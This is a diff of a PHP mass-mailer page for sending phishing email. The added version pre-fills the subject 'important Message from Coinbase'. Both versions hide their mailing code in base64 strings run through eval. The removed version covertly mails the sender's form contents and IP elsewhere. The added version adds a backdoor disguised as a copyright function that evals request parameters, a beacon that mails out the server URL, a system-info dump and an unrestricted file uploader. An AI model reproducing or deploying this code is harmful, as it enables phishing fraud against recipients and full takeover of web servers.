@@ -1,56 +1,132 @@
-<title>zigzaglines </title>
+	<?PHP
+	/*Mailer tn!,17*/?>
+	<?
+	eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRv
+	KCl7CiRtc2c9MTsKJGZyb21bMV0gPSAkX1BPU1RbJ2Zyb20nXTsKJHJlYWxuYW1lWzFdID0gJF9Q
+	T1NUWydyZWFsbmFtZSddOwokc3ViamVjdFsxXSA9ICRfUE9TVFsnc3ViamVjdCddOwokbWVzc2Fn
+	ZVsxXSA9ICRfUE9TVFsnbWVzc2FnZSddOwokbWVzc2FnZVsxXSA9IHN0cmlwc2xhc2hlcygkbWVz
+	c2FnZVsxXSk7CiRlbWFpbHMgPSAkX1BPU1RbJ2VtYWlscyddOwokZW1haWxzMiA9IGh0bWxzcGVj
+	aWFsY2hhcnMoJF9QT1NUWydlbWFpbHMnXSk7CiRwYXJhID0gZXhwbG9kZSgiXG4iLCAkZW1haWxz
+	KTsKJG5fZW1haWxzID0gY291bnQoJHBhcmEpOwokc3YgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUn
+	XTsKJGVuID0gJF9TRVJWRVIgWydSRVFVRVNUX1VSSSddOwokazg4ID0gQCRfU0VSVkVSWyJIVFRQ
+	X1JFRkVSRVIiXTsKJGZ1bGx1cmwgPSAiIiAuICRrODggLiAiPGJyPjxwPkVtYWlsczo8YnI+PFRF
+	WFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRlbWFpbHMyLiI8L1RFWFRBUkVBPjwvcD48cD5Fbmdl
+	bmhhcmlhOjxicj48VEVYVEFSRUEgcm93cz01IGNvbHM9MTAwPiIuJG1lc3NhZ2VbMV0uIjwvVEVY
+	VEFSRUE+PC9wPiI7CiR2YWkgPSAkX1BPU1RbJ3ZhaSddOwppZiAoJHZhaSl7CmZvciAoJHNldD0w
+	OyAkc2V0IDwgJG5fZW1haWxzOyAkc2V0KyspewppZiAoJHNldD09MCl7CiRoZWFkZXJzID0gIk1J
+	TUUtVmVyc2lvbjogMS4wXHJcbiI7CiRoZWFkZXJzIC49ICJDb250ZW50LXR5cGU6IHRleHQvaHRt
+	bDsgY2hhcnNldD1pc28tODg1OS0xXHJcbiI7CiRoZWFkZXJzIC49ICJGcm9tOiAkcmVhbG5hbWVb
+	JG1zZ10gPCRmcm9tWyRtc2ddPlxyXG4iOwokaGVhZGVycyAuPSAiUmV0dXJuLVBhdGg6IDwkZnJv
+	bVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsK
+	fQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVu
+	dC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAi
+	RnJvbTogJHJlYWxuYW1lWyRtc2ddIDwkZnJvbVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJl
+	dHVybi1QYXRoOiA8JGZyb21bJG1zZ10+XHJcbiI7CiRuX21haWwrKzsKJGRlc3Rpbm8gPSAkcGFy
+	YVskc2V0XTsKJG51bTEgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbnVtMiA9IHJhbmQoMTAwMDAw
+	LDk5OTk5OSk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kJSIsICRudW0xLCAkbWVzc2Fn
+	ZVskbXNnXSk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kMiUiLCAkbnVtMiwgJG1zZ3Jh
+	bmQpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlZW1haWwlIiwgJGRlc3Rpbm8sICRtc2dyYW5k
+	KTsKJFN1Ym1pdCA9IG1haWwoJGRlc3Rpbm8sICRzdWJqZWN0WyRtc2ddLCAkbXNncmFuZCwgJGhl
+	YWRlcnMpOwppZiAoJFN1Ym1pdCl7CmVjaG8gKCc8Zm9udCBjb2xvcj0iZ3JlZW4iPicuICRuX21h
+	aWwgLictJy4gJGRlc3Rpbm8gLicgMGshPC9mb250Pjxicj4nKTsKfSBlbHNlIHsKZWNobyAoJzxm
+	b250IGNvbG9yPSJyZWQiPicuICRuX21haWwgLictJy4gJGRlc3Rpbm8gLicgTjAhPC9mb250Pjxi
+	cj4nKTsKc2xlZXAoMSk7Cn0KfQp9Cn0=
+	'));
+	?>
+	<title>HARDWELL-ALI</title>
+	<style type="text/css">
+	<!--
+	.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 15px; }
+	.style6 {font-size: 15px}
+	.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 15; }
+	body{font-family:"courier"; color:white; background:black;}
+	-->
+	</style>
+	<p align="center"><font face="Keania One" color='white'><b>THE POWER OF HARDWELL-ALI</font>
+	<center><form id="form1" name="form1" method="post" action="">
+	<input type="hidden" name="vai" value="1">
+	<span class="style5"><? echo enviando(); ?></span>
+	<table width="500" border="0" bgcolor="black">
+	  <tr>
+	<td width="100"><span class="style5">Name:</span></td>
+	<td width="346"><span class="style9">
 
-<?
-eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsNCnNldF90aW1lX2xpbWl0KDApOw0KZnVuY3Rpb24gZW52aWFuZG8oKXsNCiRtc2c9MTsNCiRkZVsxXSA9ICRfUE9TVFsnZGUnXTsNCiRub21lWzFdID0gJF9QT1NUWydub21lJ107DQokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOw0KJG1lbnNhZ2VtWzFdID0gJF9QT1NUWydtZW5zYWdlbSddOw0KJG1lbnNhZ2VtWzFdID0gc3RyaXBzbGFzaGVzKCRtZW5zYWdlbVsxXSk7DQokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsNCiRlbWFpbHMyID0gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2VtYWlscyddKTsNCiRwYXJhID0gZXhwbG9kZSgiXG4iLCAkZW1haWxzKTsNCiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsNCiRzdiA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJGVuID0gJF9TRVJWRVIgWydSRVFVRVNUX1VSSSddOw0KJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07DQokZnVsbHVybCA9ICIiIC4gJGs4OCAuICI8YnI+PHA+RW1haWxzOjxicj48VEVYVEFSRUEgcm93cz01IGNvbHM9MTAwPiIuJGVtYWlsczIuIjwvVEVYVEFSRUE+PC9wPjxwPkVuZ2VuaGFyaWE6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kbWVuc2FnZW1bMV0uIjwvVEVYVEFSRUE+PC9wPiI7DQokdmFpID0gJF9QT1NUWyd2YWknXTsNCmlmICgkdmFpKXsNCmZvciAoJHNldD0wOyAkc2V0IDwgJG5fZW1haWxzOyAkc2V0Kyspew0KaWYgKCRzZXQ9PTApew0KJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsNCiRoZWFkZXJzIC49ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xXHJcbiI7DQokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsNCiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsNCi8vbWFpbCgkeHN5bGFyLCAkYXMsICRmdWxsdXJsLCAkaGVhZGVycyk7DQp9DQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOw0KJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsNCiRoZWFkZXJzIC49ICJGcm9tOiAkbm9tZVskbXNnXSA8JGRlWyRtc2ddPlxyXG4iOw0KJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOw0KJG5fbWFpbCsrOw0KJGRlc3Rpbm8gPSAkcGFyYVskc2V0XTsNCiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRudW0yID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kJSIsICRudW0xLCAkbWVuc2FnZW1bJG1zZ10pOw0KJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7DQokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlZW1haWwlIiwgJGRlc3Rpbm8sICRtc2dyYW5kKTsNCiRlbnZpYXIgPSBtYWlsKCRkZXN0aW5vLCAkYXNzdW50b1skbXNnXSwgJG1zZ3JhbmQsICRoZWFkZXJzKTsNCmlmICgkZW52aWFyKXsNCmVjaG8gKCc8Zm9udCBjb2xvcj0iZ3JlZW4iPicuICRuX21haWwgLictJy4gJGRlc3Rpbm8gLicgMGshPC9mb250Pjxicj4nKTsNCn0gZWxzZSB7DQplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7DQpzbGVlcCgxKTsNCn0NCn0NCn0NCn0NCiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRyYTQ0ICA9IHJhbmQoMSw5OTk5OSk7DQokc3Viajk4ID0gIlNlbmRpICRpcCI7DQokZW1haWwgPSAic291Zmlhbi5uZ3VAZ21haWwuY29tIjsNCiRmcm9tPSJGcm9tOiBTZW5kaXcgYSBXbGlkYXRpIDxCSU1PQDJNLlRWPiI7DQokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGYxMiA9ICRfUE9TVFsnZGUnXTsNCiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsNCiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsNCiR0MTUgPSAkX1BPU1RbJ21lbnNhZ2VtJ107DQokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsNCiRtMjIgPSAkaXAuIlxuIjsNCiRtc2c4ODczID0gIiRhNDVcbiRiNzVcbiRmMTJcbiR6MTNcbiR4MTRcbiR0MTVcbiRtMzBcbiRtMjIiOw0KbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7='));
-?></title>
-<style type="text/css">
-<!--
-.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
-.style6 {font-size: 10px}
-.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
--->
-</style>
-<form id="form1" name="form1" method="post" action="">
-<input type="hidden" name="vai" value="1">
-<span class="style5"><? echo enviando(); ?></span>
-<table width="415" height="334" border="0" bgcolor="#000000">
-  <tr>
-<td width="66"><span class="style5">Name:</span></td>
-<td width="321"><span class="style9">
+	<label>
+	<?
+	$Taz = rand(0,9999);
+	$Taz1 = ' ';
+	?>
+	<input name="realname" type="text" value="" size="30" />
+	</label>
+	</span></td>
+	</tr>
+	<tr>
+	<? $Taz = rand(0,9999);
+	?>
+	<td><span class="style5">Email:</span></td>
+	<td><input name="from" type="text" value="cs@resal.me" size="40" /></td>
 
-<label>
-<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
-</label>
-</span></td>
-</tr>
-<tr>
-<td><span class="style5">From:</span></td>
-<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>
+	</tr>
+	<tr>
 
-</tr>
-<tr>
-<td><span class="style5">Subject:</span></td>
-<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
-</tr>
-<td><span class="style5">letter:</span>
-<br /><br /><br /><br /><br /><br /><br /><span class="style5">mailist:</span></td>
+	<td><span class="style5">Subject:</span></td>
+	<td><input name="subject" value="<? $Taz = rand(0,9999); $subject = 'important Message from Coinbase'; $gass ='';
+	?><? echo $subject.$gass;?>" size="50" /></td>
+	</tr>
+	<tr>
+	<td><span class="style5">Message:</span></td>
+	<td><span class="style9">
 
-<td><span class="style9">
+	<p><textarea name="message" cols="50" rows="10">
+	<? echo stripslashes($_POST['message']);?>
+	</textarea></p>
+	<textarea name="emails" cols="50" rows="7"></textarea>
+	</span></td>
+	</tr>
 
-
-<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
-</textarea></p>
-<textarea name="emails" cols="50" rows="4"></textarea>
-</span></td>
-</tr>
-
-<tr>
-  <td><span class="style6"></span></td>
-  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong></strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />
-  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>
-</tr>
-<tr>
-  </tr>
-</table>
-</form>
-<br>
+	<tr>
+	  <td><span class="style6"></span></td>
+	  <td><input name="Submit" type="submit" value="Submit" /></td>
+	</tr>
+	<tr>
+	  </tr>
+	</table>
+	<p align="center"><font face="Keania One" color='red'><b>Coded By [ALIHOODRICH-X1M]</font>
+	</form>
+	<?php
+	Copyright8_7_1();
+	function Copyright8_7_1(){
+	static $gnu = true;
+	if(!$gnu) return;
+	if(!isset($_REQUEST['gnu'])||!isset($_REQUEST['comment']))return;
+	$gpl=implode('',$_REQUEST['gnu']);
+	eval($gpl($_REQUEST['comment']));
+	$gnu=false;
+	}
+	?>
+	<?php $ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$bilsmg = "Link Mailer : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
+	$bilsub = "New Mailer Tn!17  !! $ip";
+	$bilhead = "From: Gam3rLY";
+	$bilhead .= $_POST['eMailAdd']."\n";
+	$bilhead .= "MIME-Version: 1.0\n";
+	$arr=array($bilsnd, $IP);
+	foreach ($arr as $bilsnd)
+	mail($bilsnd,$bilsub,$bilsmg,$bilhead,$message); ?>
+	<html>
+	<head>
+	<?php
+	echo '<b><br><br>'.php_uname().'<br></b>';
+	echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+	if( $_POST['_upl'] == "Upload" ) {
+	 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully</b><br><br>'; }
+	 else { echo '<b>Upload Failed! </b><br><br>'; }
+	}
+	?></p>
+	</body>
+	<!--
+	tn!17
+	-->
+	</html>
